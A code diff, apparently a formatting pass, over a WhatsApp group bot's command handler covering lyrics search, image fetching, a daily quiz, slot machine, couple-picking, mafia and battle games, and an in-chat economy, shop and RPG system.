+                const { data: response } = await axios.get(
+                  `https://lrclib.net/api/search?q=${encodedQuery}`,
+                );
+
+                if (!response || response.length === 0) {
+                  return await AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    { text: "No lyrics found for this song." },
+                    { quoted: msg },
+                  );
+                }
+
+                const interactiveButtons = [
+                  {
+                    name: "single_select",
+                    buttonParamsJson: JSON.stringify({
+                      title: "Select a song to get lyrics",
+                      sections: [
+                        {
+                          title: `top ${response.length < 10 ? response.length : 10} songs`,
+                          highlight_label: "Select",
+                          rows: response.slice(0, 10).map((song) => ({
+                            header: song.name || "Unknown",
+                            title: song.artistName || "Unknown Artist",
+                            description: song.albumName || "Unknown Album",
+                            id: `.lyric_select ${song.id}`,
+                          })),
+                        },
+                      ],
+                    }),
+                  },
+                ];
+
+                const interactiveMessage = {
+                  text: `Found ${response.length} results for "${text}". Choose a song to get lyrics:`,
+                  title: `Hello ${msg.pushName || "User"}`,
+                  footer: "Powered by HANSAKA",
+                  interactiveButtons,
+                };
+
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  interactiveMessage,
+                  {
+                    quoted: msg,
+                  },
+                );
+              } catch (e) {
+                await AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: e.message,
+                });
+              }
+              break;
+            }
+            case "lyric_select": {
+              if (!text) mess.reply("song name requred for search lyrics");
+              axios
+                .get(`https://lrclib.net/api/get/${text}`)
+                .then(async (response) => {
+                  response = response.data;
+                  const painlyrics = `*Song name* :  _${response.name}_ \n\n*Artist name* :  _${response.artistName}_\n\n*Album name* :  _${response.albumName}_\n\n\n*Lyrics* :  \n\n ${response.plainLyrics}`;
+                  await AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    { text: painlyrics },
+                    { quoted: msg },
+                  );
+                });
+              break;
+            }
+
+            case "coffee":
+            case "food":
+            case "holo":
+            case "kanna": {
+              axios
+                .get(`https://api.night-api.com/images/sfw/${command}`, {
+                  headers: {
+                    authorization: process.env.NIGHTAPI_AUTH,
+                  },
+                })
+                .then(function (response) {
+                  const imageUrl = response.data.content.url;
+                  const imagesavepath = `./temp/${response.data.content.id}`;
+                  const writer = fs.createWriteStream(
+                    path.join(__dirname, "..", imagesavepath),
+                  );
+
+                  axios({
+                    url: imageUrl,
+                    method: "GET",
+                    responseType: "stream",
+                  })
+                    .then((imageResponse) => {
+                      imageResponse.data.pipe(writer);
+                      writer.on("finish", () => {
+                        AlexaInc.sendMessage(
+                          msg.key.remoteJid,
+                          {
+                            image: {
+                              url: imagesavepath,
+                            },
+                            caption: `Your ${command} is ready`,
+                          },
+                          {
+                            quoted: msg,
+                          },
+                        );
+
+                        fs.remove(imagesavepath)
+                          .then(() => {
+                            console.log("Image deleted successfully");
+                          })
+                          .catch((err) => {
+                            console.log("Error deleting the image:", err);
+                          });
+                      });
+                    })
+                    .catch((err) => {
+                      console.log("Error downloading the image:", err);
+                    });
+                })
+                .catch(function (error) {
+                  AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      text: "Cant send now i will send later",
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  );
+                });
+
+              break;
+            }
+
+            case "dailyqa": {
+              if (!QanAdata[sender]) {
+                QanAdata[sender] = {
+                  name: msg.pushName,
+                  qstasked: 0,
+                  answered: 0,
+                  answeres: [],
+                  incorrect: 0,
+                  correct: 0,
+                };
+                const qstasked = QanAdata[sender].qstasked;
+                QanAdata[sender].qstasked++;
+                saveQanAdata(QanAdata);
+
+                const qtan = questionsss[qstasked + 1];
+
+                const preparedquestion = `${qtan.question}\n1. ${qtan.a1}\n2. ${qtan.a2}\n3. ${qtan.a3}\n4. ${qtan.a4}`;
+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: `🎮 *Q&A challange Started!*\n questions: 20\nUse: .answer <number>`,
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: preparedquestion,
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+
+                break;
+              } else {
+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "⚠️ You already played daily q&a game! try again yesterday.",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              }
+
+              break;
+            }
+
+            case "answer": {
+              if (!QanAdata[sender]) {
+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "Q&A session curently not activated use `.dailyqa` to active",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              } else {
+                QanAdata[sender].answered++;
+                const qstasked = QanAdata[sender].qstasked;
+
+                if (QanAdata[sender].answered >= 20) {
+                  QanAdata[sender].answered = 20;
+                  saveQanAdata(QanAdata);
+                  AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      text:
+                        "⚠️ You are done wait Hansaka will anounce the winner. Correct count" +
+                        QanAdata[sender].correct,
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  );
+                } else if (QanAdata[sender].answered <= 20) {
+                  const qtan = questionsss[qstasked + 1];
+
+                  const preparedquestion = `${qtan.question}\n1. ${qtan.a1}\n2. ${qtan.a2}\n1. ${qtan.a3}\n1. ${qtan.a4}`;
+                  AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      text: preparedquestion,
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  );
+
+                  QanAdata[sender].qstasked++;
+                  QanAdata[sender].answeres.push(text);
+
+                  console.log(
+                    `answer is :${questionsss[qstasked].ca} user say:${args[0]}`,
+                  );
+                  if (questionsss[qstasked].ca == text) {
+                    QanAdata[sender].correct++;
+                  } else {
+                    QanAdata[sender].incorrect++;
+                  }
+
+                  saveQanAdata(QanAdata);
+                }
+              }
+              break;
+            }
+
+            // gamesssssss
+            case "slot": {
+              const sotoy = [
+                "🍊 : 🍒 : 🍐 *YOU LOSE BRO*",
+                "🍒 : 🔔 : 🍊 *YOU LOSE BRO*",
+                "🍇 : 🍇 : 🍐 *YOU LOSE BRO*",
+                "🍊 : 🍋 : 🔔 *YOU LOSE BRO*", //ANKER
+                "🔔 : 🍒 : 🍐 *YOU LOSE BRO*",
+                "🔔 : 🍒 : 🍊 *YOU LOSE BRO*",
+                "🍊 : 🍋 : 🔔 *YOU LOSE BRO*",
+                "🍒 : 🍒 : 🍒 *You Win👑*",
+                "🍐 : 🍒 : 🍐 *YOU LOSE BRO*",
+                "🍊 : 🍒 : 🍒 *YOU LOSE BRO*",
+                "🔔 : 🔔 : 🍇 *YOU LOSE BRO*",
+                "🍌 : 🍌 : 🔔 *YOU LOSE BRO*",
+                "🍐 : 🔔 : 🔔 *YOU LOSE BRO*",
+                "🍊 : 🍋 : 🍒 *YOU LOSE BRO*",
+                "🍋 : 🍋 : 🍋 *You Win👑*",
+                "🔔 : 🔔 : 🍇 *YOU LOSE BRO*",
+                "🔔 : 🍇 : 🍇 *YOU LOSE BRO*",
+                "🔔 : 🍐 : 🔔",
+                "🍌 : 🍌 : 🍌 *You Win👑*",
+              ];
+              const dripslot = sotoy[Math.floor(Math.random() * sotoy.length)];
+              const datane = fs.readFileSync("./assets/nothing.json");
+              jsonData = JSON.parse(datane);
+              randIndex = Math.floor(Math.random() * jsonData.length);
+              randKey = jsonData[randIndex];
+              buffer = await getBuffer(randKey.result);
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  image: buffer,
+                  caption: "*SLOT MACHINE*\n" + dripslot,
+                },
+                {
+                  quoted: msg,
+                },
+              );
+
+              break;
+            }
+
+            case "shipping":
+            case "couple": {
+              if (!isGroup) return mess.group();
+
+              const datajson = `./${shippingflder}/${msg.key.remoteJid}.json`;
+              const todaya = new Date().toLocaleDateString();
+
+              const participantids = participants.map((user) => user.id);
+
+              let jsonData;
+              let todatcouple;
+              let couples = []; // Default to an empty array
+
+              try {
+                // --- 1. READ EXISTING FILE ---
+                const fileData = fs.readFileSync(datajson, "utf8");
+                jsonData = JSON.parse(fileData);
+
+                // Fix for old/corrupted JSON
+                couples = Array.isArray(jsonData.couples)
+                  ? jsonData.couples
+                  : [];
+
+                const coupleids = couples.flatMap((item) => item.couple);
+
+                if (jsonData.lastchoosen === todaya) {
+                  // --- 2A. COUPLE ALREADY CHOSEN TODAY ---
+                  todatcouple = couples.find(
+                    (item) => item.date === todaya,
+                  )?.couple;
+                } else {
+                  // --- 2B. CHOOSE A NEW COUPLE ---
+                  let available = participantids.filter(
+                    (id) => !coupleids.includes(id),
+                  );
+
+                  if (available.length < 2) {
+                    available = [...participantids];
+                  }
+
+                  todatcouple = available
+                    .sort(() => 0.5 - Math.random())
+                    .slice(0, 2);
+                  couples.push({
+                    date: todaya,
+                    couple: todatcouple,
+                  });
+                }
+
+                // --- 3. UPDATE JSON DATA ---
+                jsonData = {
+                  lastchoosen: todaya,
+                  couples: couples,
+                };
+              } catch (error) {
+                if (error.code === "ENOENT") {
+                  // --- 1. FILE DOESN'T EXIST (FIRST TIME RUN) ---
+                  todatcouple = participantids
+                    .sort(() => 0.5 - Math.random())
+                    .slice(0, 2);
+
+                  jsonData = {
+                    lastchoosen: todaya,
+                    couples: [
+                      {
+                        date: todaya,
+                        couple: todatcouple,
+                      },
+                    ],
+                  };
+
+                  try {
+                    fs.mkdirSync(path.dirname(datajson), {
+                      recursive: true,
+                    });
+                  } catch (writeError) {
+                    console.error("Error creating directory:", writeError);
+                  }
+                } else {
+                  // --- OTHER ERRORS (like JSON parse error) ---
+                  console.error("Error handling shipping data:", error);
+                  await AlexaInc.sendMessage(msg.key.remoteJid, {
+                    text: "An error occurred. Please contact the owner.",
+                  });
+                  break; // Stop execution
+                }
+              }
+
+              // --- 4. SEND MESSAGE & SAVE FILE (MODIFIED) ---
+
+              // This is the variable we will send
+              let coupleToSend = todatcouple;
+
+              // **THIS IS THE FIX:**
+              // If 'todatcouple' is undefined, but we *know* a couple was chosen today,
+              // we must find it again from the 'jsonData' we just loaded/created.
+              if (
+                (!coupleToSend || coupleToSend.length !== 2) &&
+                jsonData &&
+                jsonData.lastchoosen === todaya
+              ) {
+                const todaysCouplesArray = Array.isArray(jsonData.couples)
+                  ? jsonData.couples
+                  : [];
+                coupleToSend = todaysCouplesArray.find(
+                  (item) => item.date === todaya,
+                )?.couple;
+              }
+
+              // Now, we check if we have a valid couple to send
+              if (coupleToSend && coupleToSend.length === 2) {
+                await AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: `Today couple is 
+@${coupleToSend[0].replace("@s.whatsapp.net", "")} and @${coupleToSend[1].replace("@s.whatsapp.net", "")}
 Congratulations ❤️`,
-                                    mentions: coupleToSend
-                                });
-
-                                // Save the updated data (this is important if a *new* couple was chosen)
-                                try {
-                                    fs.writeFileSync(datajson, JSON.stringify(jsonData, null, 2), 'utf8');
-                                } catch (writeError) {
-                                    console.error('Error writing shipping file:', writeError);
-                                }
-
-                            } else {
-                                // This block now only runs if something is truly wrong
-                                console.warn('Could not determine a couple for shipping.');
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `Sorry, I couldn't figure out the couple for today.`
-                                });
-                            }
-
-                            break;
-                        }
-
-
-
-
-                        case 'startchain':
-                            await handleStartChain(msg, AlexaInc);
-                            break;
-                        case 'joinchain':
-                            await handleJoinChain(msg, AlexaInc);
-                            break;
-                        case 'stopchain':
-                            await handleStopChain(msg, AlexaInc);
-                            break;
-
-
-
-                        // 🆕 CREATE GAME
-                        case "newmafia": {
-                            if (!isGroup) return mess.group();
-                            await mafiaGame.createGame(AlexaInc, msg, botJid.split("@")[0]);
-                            break;
-                        }
-
-                        // ⏳ EXTEND REGISTRATION TIME (New Feature)
-                        case "extendmafia": {
-                            if (!isGroup) return mess.group();
-                            await mafiaGame.extendRegistration(AlexaInc, msg);
-                            break;
-                        }
-
-                        // ⚡ MANUAL START
-                        case "startmafia": {
-                            if (!isGroup) return mess.group();
-                            await mafiaGame.startGame(AlexaInc, msg);
-                            break;
-                        }
-
-                        // 🏆 LEADERBOARD
-                        case "mafiatop": {
-                            await mafiaGame.showLeaderboard(AlexaInc, msg);
-                            break;
-                        }
-
-                        case "newassassin":
-                        case "assassin": {
-                            if (!isGroup) return mess.group();
-                            await Assassin.createGame(AlexaInc, msg, botJid.split("@")[0]);
-                            break;
-                        }
-
-                        case "startassassin": {
-                            if (!isGroup) return mess.group();
-                            await Assassin.startGame(AlexaInc, msg);
-                            break;
-                        }
-
-                        case "assassintop": {
-                            await Assassin.showLeaderboard(AlexaInc, msg);
-                            break;
-                        }
-                        case "battle": {
-
-                            const mentionedJids = p.mentionedJids;
-                            let resultNumbers = []; // Initialize as an array
-
-                            if (mentionedJids && mentionedJids.length > 0) {
-                                // 1. Map over ALL mentionedJids
-                                resultNumbers = mentionedJids.map(rid => {
-                                    if (rid.endsWith('@lid')) {
-                                        // Find the ID and strip the server part
-                                        return rid;
-                                    } else if (rid.endsWith('@s.whatsapp.net')) {
-                                        // Find the LID and strip the server part
-                                        return (participants.find(jsn => jsn.id === rid))
-                                            ?.lid
-                                    }
-                                    return null; // Return null if the JID format isn't recognized
-                                })
-                                    // 2. Filter out any null/undefined results (where a match wasn't found)
-                                    .filter(Boolean); // 'Boolean' removes falsy values (null, undefined, "")
-                            } else {
-                                resultNumbers = null
-                            }
-                            if (!resultNumbers) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'pleace mention a user to start battle'
-                            })
-                            if (resultNumbers.length > 1) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'you only can battle with one user at one time'
-                            })
-                            let res = battlearena.startBattle(msg.key.remoteJid, `@` + finalLid.replace(/@.*/, ""),
-                                `@` + resultNumbers[0].replace(/@.*/, ""));
-
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: res.message,
-                                mentions: [finalLid, resultNumbers[0]]
-                            }, {
-                                quoted: msg
-                            })
-
-                            break
-                        }
-
-                        case "attack":
-                        case "heal":
-                        case "defend":
-                        case "special": {
-
-                            let res = battlearena.playerMove(msg.key.remoteJid, `@` + finalLid.replace(/@.*/, ""),
-                                command);
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: res.message,
-                                mentions: res.players || []
-                            }, {
-                                quoted: msg
-                            })
-
-                            break
-                        }
-
-                        case "battletop": {
-
-                            let res = battlearena.getLeaderboard();
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: res.msg,
-                                mentions: res.uids || []
-                            }, {
-                                quoted: msg
-                            })
-
-                            break
-                        }
-
-
-
-                        // ----- Economy -----
-                        case 'balance':
-                        case 'bal':
-                        case 'wallet': {
-                            let target = finalLid;
-                            if (p.mentionedJids?.length) target = p.mentionedJids[0];
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: await economy.balance(target),
-                                mentions: [target]
-                            }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'claim': {
-                            const ecoRes = await economy.claimDaily(finalLid);
-                            AlexaInc.sendMessage(msg.key.remoteJid, { text: ecoRes.message }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'work': {
-                            const ecoRes = await economy.doWork(finalLid);
-                            AlexaInc.sendMessage(msg.key.remoteJid, { text: ecoRes.message }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'rob': {
-                            if (!p.mentionedJids?.length) {
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'Mention who you want to rob! e.g. .rob @user'
-                                }, { quoted: msg });
-                            }
-                            const ecoRes = await economy.robUser(finalLid, p.mentionedJids[0]);
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: ecoRes.message,
-                                mentions: [finalLid, p.mentionedJids[0]]
-                            }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'pay': {
-                            if (!p.mentionedJids?.length || !args[1]) {
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'Usage: .pay @user <amount>'
-                                }, { quoted: msg });
-                            }
-                            const ecoRes = await economy.pay(finalLid, p.mentionedJids[0], args[1]);
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: ecoRes.message,
-                                mentions: [finalLid, p.mentionedJids[0]]
-                            }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'deposit':
-                        case 'dep': {
-                            const ecoRes = await economy.deposit(finalLid, args[0]);
-                            AlexaInc.sendMessage(msg.key.remoteJid, { text: ecoRes.message }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'withdraw':
-                        case 'wd': {
-                            const ecoRes = await economy.withdraw(finalLid, args[0]);
-                            AlexaInc.sendMessage(msg.key.remoteJid, { text: ecoRes.message }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'baltop':
-                        case 'richest': {
-                            const ecoRes = await economy.leaderboard();
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: ecoRes.message,
-                                mentions: ecoRes.mentions
-                            }, { quoted: msg });
-                            break;
-                        }
-
-                        // ----- Shop / Inventory -----
-                        case 'shop': {
-                            AlexaInc.sendMessage(msg.key.remoteJid, { text: shop.listShop() }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'buy': {
-                            if (!args[0]) {
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'Usage: .buy <item_id> — see .shop'
-                                }, { quoted: msg });
-                            }
-                            const shopRes = await shop.buyItem(finalLid, args[0]);
-                            AlexaInc.sendMessage(msg.key.remoteJid, { text: shopRes.message }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'inventory':
-                        case 'inv': {
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: await shop.showInventory(finalLid)
-                            }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'sell': {
-                            if (!args[0]) {
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'Usage: .sell <item_id>'
-                                }, { quoted: msg });
-                            }
-                            const shopRes = await shop.sellItem(finalLid, args[0]);
-                            AlexaInc.sendMessage(msg.key.remoteJid, { text: shopRes.message }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'settitle': {
-                            const shopRes = await shop.setTitle(finalLid, text);
-                            AlexaInc.sendMessage(msg.key.remoteJid, { text: shopRes.message }, { quoted: msg });
-                            break;
-                        }
-
-                        // ----- RPG Leveling -----
-                        case 'class': {
-                            const rpgRes = await rpg.chooseClass(finalLid, text);
-                            AlexaInc.sendMessage(msg.key.remoteJid, { text: rpgRes.message }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'rpgprofile': {
-                            let target = finalLid;
-                            let name = msg.pushName;
-                            if (p.mentionedJids?.length) { target = p.mentionedJids[0]; name = null; }
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: await rpg.profile(target, name),
-                                mentions: [target]
-                            }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'profile': {
-
-                            // if (isGroup) {
-                            //     return mess.reply('🔐 For your privacy, send *.profile* to me in a private chat.');
-                            // }
-                            if (!userProfiles.isLid(finalLid)) {
-                                return mess.reply('I could not read your WhatsApp LID yet. Send any message and try *.profile* again.');
-                            }
-                            try {
-                                await userProfiles.ensureAccount({
-                                    lid: finalLid,
-                                    whatsappJid: finalJid,
-                                    displayName: msg.pushName,
-                                });
-                                const profile = await userProfiles.getProfileSummary(finalLid);
-                                const msgtext = (!isGroup) ? userProfiles.formatProfileMessage(profile) : userProfiles.formatsecretProfileMessage(profile) ;
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: msgtext
-                                }, { quoted: msg });
-                            } catch (profileError) {
-                                console.error('[profile] Failed to send profile:', profileError.message);
-                                await mess.reply('❌ Your profile is temporarily unavailable. Please try again later.');
-                            }
-                            break;
-                        }
-
-                        case 'changpw': {
-
-                            if (isGroup) return mess.private();
-                            if (!userProfiles.isLid(finalLid)) {
-                                return mess.reply('I could not read your WhatsApp LID yet. Send any message and try again.');
-                            }
-                            if (!text) return mess.reply('Usage: *.changpw <new password>* (10–128 characters)');
-                            try {
-                                const result = await userProfiles.changePassword(finalLid, text);
-                                await mess.reply(result.ok ? '✅ Password changed successfully. Keep it private.' : `❌ ${result.message}`);
-                            } catch (passwordError) {
-                                console.error('[profile] Failed to change password:', passwordError.message);
-                                await mess.reply('❌ Could not change your password right now. Please try again later.');
-                            }
-                            break;
-                        }
-
-                        case 'train': {
-                            const rpgRes = await rpg.train(finalLid);
-                            AlexaInc.sendMessage(msg.key.remoteJid, { text: rpgRes.message }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'dungeon': {
-                            const rpgRes = await rpg.dungeon(finalLid);
-                            AlexaInc.sendMessage(msg.key.remoteJid, { text: rpgRes.message }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'rpgtop': {
-                            const rpgRes = await rpg.leaderboard();
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: rpgRes.message,
-                                mentions: rpgRes.mentions
-                            }, { quoted: msg });
-                            break;
-                        }
-
-                        // ----- Truth or Dare / Would You Rather -----
-                        case 'truth': {
-                            if (!isGroup) return mess.group();
-                            const target = p.mentionedJids?.[0] || null;
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: tod.getTruth(target),
-                                mentions: target ? [target] : []
-                            }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'dare': {
-                            if (!isGroup) return mess.group();
-                            const target = p.mentionedJids?.[0] || null;
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: tod.getDare(target),
-                                mentions: target ? [target] : []
-                            }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'tod': {
-                            if (!isGroup) return mess.group();
-                            const target = p.mentionedJids?.[0] || null;
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: tod.getTruthOrDare(target),
-                                mentions: target ? [target] : []
-                            }, { quoted: msg });
-                            break;
-                        }
-
-                        case 'wyr': {
-                            if (!isGroup) return mess.group();
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: tod.getWouldYouRather()
-                            }, { quoted: msg });
-                            break;
-                        }
-                        // ================= END NEW GAMES ADD-ON PACK =================
-
-                        case 'newhang':
-                            break;
-                        case 'joinhang':
-                            break;
-                        case 'starthang':
-                            break;
-                        case 'endhang':
-                            break;
-                        case 'hanglead':
-                            break;
-
-
-                        case 'maintain': {
-                            if (!isOwner) return mess.owner();
-                            if (!text) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'send on or off'
-                            }, {
-                                quoted: msg
-                            });
-
-                            const mode = args[0]?.toLowerCase();
-
-                            if (!mode || (mode !== 'on' && mode !== 'off')) {
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: '⚙️ Usage:\n.maintain on – enable maintenance mode\n.maintain off – disable maintenance mode'
-                                }, {
-                                    quoted: msg
-                                });
-                            }
-
-                            const isOn = mode === 'on';
-                            updateBotStatus(isOn, isOn ? '🚧 Bot under maintenance.' : '✅ Bot is active.');
-
-                            return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: `🔧 Maintenance mode ${isOn ? 'enabled' : 'disabled'}.`
-                            }, {
-                                quoted: msg
-                            });
-                            break;
-                        }
-
-
-                        case 'botst': {
-
-                            const status = loadBotStatus();
-
-                            const statusMsg = `🤖 *Bot Status:*\n\n` +
-                                `🟢 Mode: ${status.underMaintenance ? '🟥 Under Maintenance' : '🟩 Active'}\n` +
-                                `💬 Message: ${status.message}`;
-
-                            return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: statusMsg
-                            }, {
-                                quoted: msg
-                            });
-                            break;
-                        }
-
-
-                        case 'news': {
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                react: {
-                                    text: '🔄',
-                                    key: msg.key
-                                }
-                            });
-                            fetchnews().then(response => {
-
-                                const message2send =
-                                    `\n
+                  mentions: coupleToSend,
+                });
+
+                // Save the updated data (this is important if a *new* couple was chosen)
+                try {
+                  fs.writeFileSync(
+                    datajson,
+                    JSON.stringify(jsonData, null, 2),
+                    "utf8",
+                  );
+                } catch (writeError) {
+                  console.error("Error writing shipping file:", writeError);
+                }
+              } else {
+                // This block now only runs if something is truly wrong
+                console.warn("Could not determine a couple for shipping.");
+                await AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: `Sorry, I couldn't figure out the couple for today.`,
+                });
+              }
+
+              break;
+            }
+
+            case "startchain":
+              await handleStartChain(msg, AlexaInc);
+              break;
+            case "joinchain":
+              await handleJoinChain(msg, AlexaInc);
+              break;
+            case "stopchain":
+              await handleStopChain(msg, AlexaInc);
+              break;
+
+            // 🆕 CREATE GAME
+            case "newmafia": {
+              if (!isGroup) return mess.group();
+              await mafiaGame.createGame(AlexaInc, msg, botJid.split("@")[0]);
+              break;
+            }
+
+            // ⏳ EXTEND REGISTRATION TIME (New Feature)
+            case "extendmafia": {
+              if (!isGroup) return mess.group();
+              await mafiaGame.extendRegistration(AlexaInc, msg);
+              break;
+            }
+
+            // ⚡ MANUAL START
+            case "startmafia": {
+              if (!isGroup) return mess.group();
+              await mafiaGame.startGame(AlexaInc, msg);
+              break;
+            }
+
+            // 🏆 LEADERBOARD
+            case "mafiatop": {
+              await mafiaGame.showLeaderboard(AlexaInc, msg);
+              break;
+            }
+
+            case "newassassin":
+            case "assassin": {
+              if (!isGroup) return mess.group();
+              await Assassin.createGame(AlexaInc, msg, botJid.split("@")[0]);
+              break;
+            }
+
+            case "startassassin": {
+              if (!isGroup) return mess.group();
+              await Assassin.startGame(AlexaInc, msg);
+              break;
+            }
+
+            case "assassintop": {
+              await Assassin.showLeaderboard(AlexaInc, msg);
+              break;
+            }
+            case "battle": {
+              const mentionedJids = p.mentionedJids;
+              let resultNumbers = []; // Initialize as an array
+
+              if (mentionedJids && mentionedJids.length > 0) {
+                // 1. Map over ALL mentionedJids
+                resultNumbers = mentionedJids
+                  .map((rid) => {
+                    if (rid.endsWith("@lid")) {
+                      // Find the ID and strip the server part
+                      return rid;
+                    } else if (rid.endsWith("@s.whatsapp.net")) {
+                      // Find the LID and strip the server part
+                      return participants.find((jsn) => jsn.id === rid)?.lid;
+                    }
+                    return null; // Return null if the JID format isn't recognized
+                  })
+                  // 2. Filter out any null/undefined results (where a match wasn't found)
+                  .filter(Boolean); // 'Boolean' removes falsy values (null, undefined, "")
+              } else {
+                resultNumbers = null;
+              }
+              if (!resultNumbers)
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "pleace mention a user to start battle",
+                });
+              if (resultNumbers.length > 1)
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "you only can battle with one user at one time",
+                });
+              const res = battlearena.startBattle(
+                msg.key.remoteJid,
+                `@` + finalLid.replace(/@.*/, ""),
+                `@` + resultNumbers[0].replace(/@.*/, ""),
+              );
+
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: res.message,
+                  mentions: [finalLid, resultNumbers[0]],
+                },
+                {
+                  quoted: msg,
+                },
+              );
+
+              break;
+            }
+
+            case "attack":
+            case "heal":
+            case "defend":
+            case "special": {
+              const res = battlearena.playerMove(
+                msg.key.remoteJid,
+                `@` + finalLid.replace(/@.*/, ""),
+                command,
+              );
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: res.message,
+                  mentions: res.players || [],
+                },
+                {
+                  quoted: msg,
+                },
+              );
+
+              break;
+            }
+
+            case "battletop": {
+              const res = battlearena.getLeaderboard();
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: res.msg,
+                  mentions: res.uids || [],
+                },
+                {
+                  quoted: msg,
+                },
+              );
+
+              break;
+            }
+
+            // ----- Economy -----
+            case "balance":
+            case "bal":
+            case "wallet": {
+              let target = finalLid;
+              if (p.mentionedJids?.length) target = p.mentionedJids[0];
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: await economy.balance(target),
+                  mentions: [target],
+                },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "claim": {
+              const ecoRes = await economy.claimDaily(finalLid);
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                { text: ecoRes.message },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "work": {
+              const ecoRes = await economy.doWork(finalLid);
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                { text: ecoRes.message },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "rob": {
+              if (!p.mentionedJids?.length) {
+                return AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "Mention who you want to rob! e.g. .rob @user",
+                  },
+                  { quoted: msg },
+                );
+              }
+              const ecoRes = await economy.robUser(
+                finalLid,
+                p.mentionedJids[0],
+              );
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: ecoRes.message,
+                  mentions: [finalLid, p.mentionedJids[0]],
+                },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "pay": {
+              if (!p.mentionedJids?.length || !args[1]) {
+                return AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "Usage: .pay @user <amount>",
+                  },
+                  { quoted: msg },
+                );
+              }
+              const ecoRes = await economy.pay(
+                finalLid,
+                p.mentionedJids[0],
+                args[1],
+              );
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: ecoRes.message,
+                  mentions: [finalLid, p.mentionedJids[0]],
+                },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "deposit":
+            case "dep": {
+              const ecoRes = await economy.deposit(finalLid, args[0]);
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                { text: ecoRes.message },
+                { quoted: msg },
+              );
+              break;
+            }
+
+            case "withdraw":
+            case "wd": {
+              const ecoRes = await economy.withdraw(finalLid, args[0]);
